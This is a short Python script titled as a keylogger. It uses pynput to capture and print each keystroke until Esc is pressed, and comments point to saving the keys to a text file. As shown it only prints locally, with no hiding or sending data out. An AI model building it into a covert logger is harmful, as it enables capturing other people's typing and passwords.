import pyfiglet
t = pyfiglet.figlet_format('KEYLOGGER', font='big')
print(t)

from pynput.keyboard import Key, Listener
# k = [] this for def write function , u can use it if u use def write() function

# variable to define the key
def press(key):
    #use here k.append(key) to store the data
    print(key)


# def write():
# above function is to store the data in the txt extension or file
# u can use it if u want to store the file the .txt format


# to write the data and save it in the above variable
def release(key):
    if key == Key.esc:
        return False


# This is the listener where the data will be moved to above wo function
with Listener(on_press=press, on_release=release) as m:
    m.join()